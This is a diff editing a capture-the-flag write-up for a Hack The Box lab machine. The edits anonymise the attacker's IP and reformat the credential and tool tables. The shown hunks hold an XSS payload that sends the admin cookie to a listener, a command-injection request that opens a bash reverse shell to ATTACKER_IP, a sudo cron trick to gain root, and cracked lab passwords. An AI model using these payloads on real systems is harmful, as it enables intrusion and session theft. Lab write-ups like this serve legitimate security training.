@@ -81,13 +81,13 @@ An admin bot crawls submitted bug reports using admin credentials — worth assu
 The listener catches the bot's callback with the admin cookie:
 
 ```bash
-┌─[eu-dedivip-1]─[10.10.14.63]─[julien23@htb-b1k4xv4cpx]─[~]
+┌─[htb]─[ATTACKER_IP]─[user@htb]─[~]
 └──╼ [★]$ sudo nc -lvnp 7080
 listening on [any] 7080 ...
 
-connect to [10.10.14.63] from (UNKNOWN) [10.129.95.86] 53010
+connect to [ATTACKER_IP] from (UNKNOWN) [10.129.95.86] 53010
 GET /image.png?c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOhMxQ.aJ3yxeyHE9oJo-gQHnAxWLVkvjM HTTP/1.1
-Host: 10.10.14.63:7080
+Host: ATTACKER_IP:7080
 Connection: keep-alive
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.0.0 Safari/537.36
 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
@@ -463,7 +463,7 @@ Accept-Encoding: gzip, deflate, br
 Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aOjCGw.izwREOZmmjTQ601z6hR4adRLIMI
 Connection: keep-alive
 
-{"imageId":"f24fff97-819a-4cf1-944c-b2c3d758d774","transformType":"crop","params":{"x":0,"y":0,"width":680,        "height": "500; bash -c 'bash -i >& /dev/tcp/10.10.14.63/7080 0>&1' #"}
+{"imageId":"f24fff97-819a-4cf1-944c-b2c3d758d774","transformType":"crop","params":{"x":0,"y":0,"width":680,        "height": "500; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/7080 0>&1' #"}
 }
 ```
 
@@ -646,15 +646,26 @@ Stage result: root. The draft records both flags together (without showing the r
 
 ## Credentials
 
-| Source                                    | Credential                                                                  | Notes                          |
-| ----------------------------------------- | --------------------------------------------------------------------------- | ------------------------------ |
-| XSS cookie theft (admin bot)              | admin session cookie `.eJw9jbEO…aJ3yxeyHE9oJo-gQHnAxWLVkvjM`                | Grants admin panel             |
-| `db.json` (via LFI)                       | `admin@imagery.htb` md5 `5d9c1d507a3f76af1e5c97a3ad1eaa31`                  | Not cracked                    |
-| `db.json` (via LFI)                       | `testuser@imagery.htb` md5 `2c65c8d7bfbca32a3ed42596192384f6` → `iambatman` | Cracked (rockyou)              |
-| `/proc/self/environ` (via LFI)            | `CRON_BYPASS_TOKEN=K7Zg9vB$24NmW!q8xR0p/runL!`                              | Admin crawler token            |
-| Admin bot source (post-`web` shell)       | `admin@imagery.htb:strongsandofbeach`                                       | Plaintext; SSH disabled for it |
-| `/var/backup/web_20250806_120723.zip.aes` | AES password `bestfriends`                                                  | Brute-forced with pyAesCrypt   |
-| Decrypted backup                          | `mark:supersmash`                                                           | Lateral move to mark           |
+**XSS cookie theft (admin bot)** — admin session cookie `.eJw9jbEO…aJ3yxeyHE9oJo-gQHnAxWLVkvjM`
+Grants admin panel.
+
+**`db.json` (via LFI)** — `admin@imagery.htb` md5 `5d9c1d507a3f76af1e5c97a3ad1eaa31`
+Not cracked.
+
+**`db.json` (via LFI)** — `testuser@imagery.htb` md5 `2c65c8d7bfbca32a3ed42596192384f6` → `iambatman`
+Cracked (rockyou).
+
+**`/proc/self/environ` (via LFI)** — `CRON_BYPASS_TOKEN=K7Zg9vB$24NmW!q8xR0p/runL!`
+Admin crawler token.
+
+**Admin bot source (post-`web` shell)** — `admin@imagery.htb:strongsandofbeach`
+Plaintext; SSH disabled for it.
+
+**`/var/backup/web_20250806_120723.zip.aes`** — AES password `bestfriends`
+Brute-forced with pyAesCrypt.
+
+**Decrypted backup** — `mark:supersmash`
+Lateral move to mark.
 
 ---
 
@@ -675,14 +686,12 @@ Stage result: root. The draft records both flags together (without showing the r
 
 ## Tools & cheat sheet
 
-| Tool                      | Purpose in this box                                 | Key command                                                                       |
-| ------------------------- | --------------------------------------------------- | --------------------------------------------------------------------------------- |
-| `gobuster`                | Route discovery on the Flask app                    | `gobuster dir -u http://<ip>:8000/ -w <wordlist>`                                 |
-| Burp Suite                | XSS delivery, LFI, upload + transform RCE           | repeat `/admin/get_system_log` and `/apply_visual_transform` requests             |
-| `nc`                      | Catch the XSS cookie callback and the reverse shell | `sudo nc -lvnp 7080`                                                              |
-| `<img onerror>` payload   | Exfil admin cookie past the `<script>` filter       | `<img sRC="x" onErRor="new Image().src='http://<ip>:7080/x?c='+document.cookie">` |
-| `hashcat` / `john`        | Crack the md5 password hashes                       | `hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt`                        |
-| pyAesCrypt script         | Brute-force the AES backup password                 | `python3 pyaes_decrypt.py web_20250806_120723.zip.aes rockyou.txt out.zip`        |
-| `/apply_visual_transform` | ImageMagick crop `shell=True` injection → RCE       | `"height": "500; bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' #"`               |
-| `charcol` (sudo NOPASSWD) | Schedule root command → SUID bash                   | `auto add --schedule "* * * * *" --command "chmod u+s /bin/bash"`                 |
-| `bash -p`                 | Root shell from SUID `/bin/bash`                    | `sleep 60 && /bin/bash -p`                                                        |
+- **`gobuster`** — Route discovery on the Flask app
+- **Burp Suite** — XSS delivery, LFI, upload + transform RCE
+- [`nc`](/hacklas/infiltration/reverse-shell/nc.md) — Catch the XSS cookie callback and the reverse shell
+- [`<img onerror>` payload](/hacklas/infiltration/web/xss-cross-site-scripting/main.md) — Exfil admin cookie past the `<script>` filter
+- [`hashcat`](/hacklas/infiltration/cracking/hashcat.md) / **`john`** — Crack the md5 password hashes
+- [pyAesCrypt script](/hacklas/infiltration/cracking/aes-file-cracking.md) — Brute-force the AES backup password
+- **`/apply_visual_transform`** — ImageMagick crop `shell=True` injection → RCE
+- [`charcol` (sudo NOPASSWD)](/hacklas/escalation/linux/sudo.md) — Schedule root command → SUID bash
+- [`bash -p`](/hacklas/escalation/linux/bash.md) — Root shell from SUID `/bin/bash`
